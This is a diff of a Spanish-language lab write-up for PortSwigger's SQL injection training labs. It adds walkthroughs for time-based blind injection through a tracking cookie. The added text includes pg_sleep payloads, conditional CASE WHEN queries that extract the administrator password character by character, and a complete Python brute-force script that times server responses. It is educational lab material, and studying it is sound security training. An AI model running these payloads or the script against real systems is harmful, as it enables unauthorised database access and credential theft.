@@ -1282,23 +1282,7 @@ Por lo que al saber esto ahora debemos enumerar dicha contraseña del usuario ad
 
 Reutilizaremos el script que ya habíamos creado.
 
-Pero esta vez solo cambiaremos algunas cosas:
-
-![cambio](/assets/images/SQLiPortswigger/lab12/cambio.png)
-
-Lo que se ve en verde es lo que estaba antes y lo que se ve en rojo es lo nuevo que hemos puesto en lugar de eso.
-
-Primero la variable "main_url", que es obvio que debe cambiar, ya que es otro laboratorio.
-
-Después el payload de la cookie, el cual agregamos nuestro nuevo payload de cookie, y también usamos los espacios donde se iran fuzeando los diferentes caracteres y posiciones.
-
-También cambio la sesion, ya que como en main_url, es otro laboratorio.
-
-Y por último cambiamos lo de verificar si en la respuesta nos devolvía el mensaje "WelcomeBack!", ya que ahora nos basaremos en la respuesta del servidor, por lo que usamos esta línea:
-
-`if  r.status_code == 500:`
-
-Y el script nos queda de la siguiente forma:
+Pero esta vez solo cambiaremos algunas cosas al script que usamos:
 
 ```py
 #!/usr/bin/python3
@@ -1350,9 +1334,221 @@ if __name__ == '__main__':
     makeRequest()
 ```
 
+Primero la variable "main_url", que es obvio que debe cambiar, ya que es otro laboratorio.
+
+Después el payload de la cookie, el cual agregamos nuestro nuevo payload de cookie, y también usamos los espacios donde se iran fuzeando los diferentes caracteres y posiciones de los bucles for.
+
+También cambio la sesion, ya que como en main_url, es otro laboratorio.
+
+Y por último cambiamos lo de verificar si en la respuesta nos devolvía el mensaje "WelcomeBack!", ya que ahora nos basaremos en la respuesta del servidor, por lo que usamos esta línea:
+
+`if  r.status_code == 500:`
+
+> Recuerda que en este caso 500 es true y 200 falso, por lo que en caso de ser 500 pasara a agregarse el carácter actual a la variable que va almacenando la contraseña.
+
 Por lo que si ya entendimos la lógica podremos ejecutarlo y completar este laboratorio.
 
 <br>
 
 # Laboratorio 13: Inyección ciega de SQL con retrasos de tiempo
 
+Este siguiente laboratorio nos pide lo siguiente:
+
+![lab13](/assets/images/SQLiPortswigger/lab13/lab13.png)
+
+Vemos que nos dice que este método de inyección no es blind basada en errores ni basada en condicionales, pero dice que esta basada en retrasos de tiempo y esta vulnerabilidad se encuentra en la cookie.
+
+<br>
+
+Primero intentaremos romper la consulta usando una comilla como lo hacemos normalmente:
+
+`TrackingId=xyz'`
+
+Y vemos que no nos da ningún error ni nada fuera de lo normal:
+
+![c1](/assets/images/SQLiPortswigger/lab13/comilla.png)
+
+Así que intentamos con 2 comillas para ver si existía alguna colgada por detrás o algo así:
+
+`TrackingId=xyz''`
+
+![c2](/assets/images/SQLiPortswigger/lab13/comilla2.png)
+
+Y podemos ver que sigue saliendo todo normal, por lo que sospechamos que no esta basada en condicionales o errores como nos mostraron anteriormente.
+
+Ahora es donde intentamos este nuevo método.
+
+![ch](/assets/images/SQLiPortswigger/lab13/cheat.png)
+
+Aquí podemos ver que hay formas de hacer llamada a una función para detener el tiempo por ciertos segundos, en este caso 10.
+
+Así que concatenamos a la consulta uno de estos y fuimos probando hasta descubrir que la correcta era:
+
+`TrackingId=xyz' || pg_sleep(10)-- -`
+
+Y al tramitar esta consulta nos esperó 10 segundos para después mostrar lo que venía por defecto, pero esto nos indica que es vulerable, ya que nos tardó el tiempo especificado en responder.
+
+![consulta](/assets/images/SQLiPortswigger/lab13/consulta.png)
+
+Así que al hacer esta consulta terminamos este laboratorio:
+
+![fin](/assets/images/SQLiPortswigger/lab13/fin.png)
+
+Pero obviamente esto solo fue una introducción, lo siguiente está en el siguiente laboratorio.
+
+<br>
+
+# Laboratorio 14: Inyección SQL ciega con retardos de tiempo y recuperación de información
+
+El siguiente laboratorio nos mostrará como enumerar datos usando una vulnerabilidad SQLi ciega basada en tiempo.
+
+El laboratorio nos dice lo siguiente:
+
+![lab14](/assets/images/SQLiPortswigger/lab14/lab14.png)
+
+Vemos que nos dice esto y debemos enumerar la contraseña del usuario "administrator" en la tabla users.
+
+<br>
+
+Recordamos que la que usamos basada en errores se veía algo así:
+
+`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) else '' END FROM users WHERE username='administrator')||'`
+
+Recordemos que verifica que existe el usuario "administrator" en la tabla username, y en caso que exista pasa a él case when donde comprobara la condición que en este caso es 1=1 por lo que da valor true, pasando a ejecutar la división que nos dará error 500.
+
+Caso contrario irá al else mostrándonos un estado 200, ya que no hemos corrompido nada.
+
+<br>
+
+Lo que haremos es algo similar, pero esta vez basándonos en la respuesta del servidor, la cadena modificada se verá algo así:
+
+`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) else pg_sleep(0) END)||'`
+
+Primero en esta consulta estamos concatenando una consulta en la cual en caso de que 1=1 se debe ejecutar el sleep de 5 segundos, y caso contrario debe hacer un sleep de 0 segundos y terminar.
+
+Así que probaremos esta consulta tramitándola y ver que respuesta da:
+
+![5seg](/assets/images/SQLiPortswigger/lab14/time5.png)
+
+Vemos que está en gris la parte de la respuesta, ya que está tardando 5 segundos en responder, y después de 5 segundos nos llega la respuesta:
+
+![5r](/assets/images/SQLiPortswigger/lab14/5r.png)
+
+Y vemos que nos responde, por lo que está interpretando nuestra consulta basada en tiempo y funcionando, ahora para confirmar que funciona le daremos que compruebe si 2=1, cosa que sabemos es falsa, pero veremos si funciona y responde como debe, tardar 0 segundos:
+
+![0seg](/assets/images/SQLiPortswigger/lab14/0seg.png)
+
+Podemos ver que tardo 0 segundos, por lo que nuestra consulta funciona y en base al tiempo podemos ir sabiendo que cosas son verdaderas y que no.
+
+<br>
+
+Así que sabemos que hay un usuario administrator en la tabla users con columna llamada "password", por lo que crearemos la consulta basada en esos datos:
+
+`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(5) else pg_sleep(0) END FROM users WHERE username='administrator')||'`
+
+En caso de que el usuario "administrator" exista en la tabla users, comprobara si el primer carácter de la contraseña de administrator es "a", en caso de serlo tardara 5 segundos, en caso de no serlo tardara 0 segundos en responder.
+
+Así que al tramitar esta consulta nos damos cuenta de que respondió en 0 segundos.
+
+Por lo que probamos con otros caracteres y nos dimos cuenta de que iniciaba con otro carácter.
+
+<br>
+
+Ahora ocupamos saber la longitud de la contraseña, que sabemos es usando:
+
+`TrackingId=xyz'||( SELECT CASE WHEN LENGTH(password)>=20 then pg_sleep(5) else pg_sleep(0) end FROM users WHERE username='administrator')||'`
+
+Le decimos que en caso de que exista el usuario administrator en la tabla users, nos  verifique si la columna password de la fila de administrator su longitud es mayor o igual a 20, y descubrimos que es igual a 20, por lo que la longitud ya la tenemos.
+
+<br>
+
+Así que para automatizar lo de dumpear la contraseña de ese usuario reutilizaremos el script que ya tenemos programado solo cambiando algunas cosas:
+
+```bash
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+#CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "https://0a3600b204db9b59c084f05d00880084.web-security-academy.net/"
+characters = string.ascii_lowercase + string.digits
+
+def makeRequest():
+    
+    password = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Password")
+
+    for position in range(1,21):
+
+        for character in characters:
+
+            cookies = {
+                    'TrackingId': "eSJZCcY0vUyeTnfo'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' then pg_sleep(15) else pg_sleep(0) end FROM users WHERE username='administrator')||'" % (position, character),
+                'session': '3j6x4gByXLok6suiJlcxoV5Rx6EwmNyP'
+                }
+            
+            p1.status(cookies['TrackingId'])
+
+            time_start = time.time()
+
+            r = requests.get(main_url, cookies=cookies)
+            
+            time_end = time.time()
+
+            if  time_end - time_start >= 15:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == '__main__':
+
+    makeRequest()
+```
+
+Primero obviamente cambiamos la url de la variable main_url, ya que como sabemos es otro laboratorio.
+
+Obviamente cambia el diccionario con el que fuzzearemos todos los caracteres y posiciones a la consulta creada asignándole sus parámetros enlazados a los ciclos for.
+
+Quedando nuestro diccionario de cookie así:
+
+`'TrackingId': "xyz'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' then pg_sleep(15) else pg_sleep(0) end FROM users WHERE username='administrator')||'" % (position, character)`
+
+Esta consulta es como la que habíamos creado, pero esta vez en vez de los valores que cambiaran para fuzzear la password de administrador, usamos los indicadores que le dirán a python que por cada ciclo cambiara un carácter y su posición, y dentro del mismo for lo que sigue es esto:
+
+```bash
+time_start = time.time()
+
+            r = requests.get(main_url, cookies=cookies)
+            
+            time_end = time.time()
+
+            if  time_end - time_start >= 15:
+                password += character
+                p2.status(password)
+                break
+```
+
+Con la variable **time_start** le estamos indicando que guarde el valor del tiempo actual.
+
+Después de eso se ejecuta la petición actual y cuando termine creamos otra variable llamada **time_end** la cual nos volverá a obtener el tiempo actual, pero obviamente será diferente al del inicio, ya que paso tiempo en lo que se ejecutó la petición GET.
+
+Después comprueba si el tiempo inicial menos el tiempo final, quedándonos solo los segundos de diferencia que pasaron durante esa petición, es mayor o igual a 15, entonces quiere decir que esa petición es **true**, por lo que se agregara a la variable de contraseña.
+
+> Recuerda que es 15 segundos, ya que en la consulta donde están las cookies decimos que si es verdadero nos haga un sleep de 15 seg.
+
+<br>
+
+Al ejecutar este script obtendremos en unos minutos la password del usuario "administrator" y habremos terminado este laboratorio.
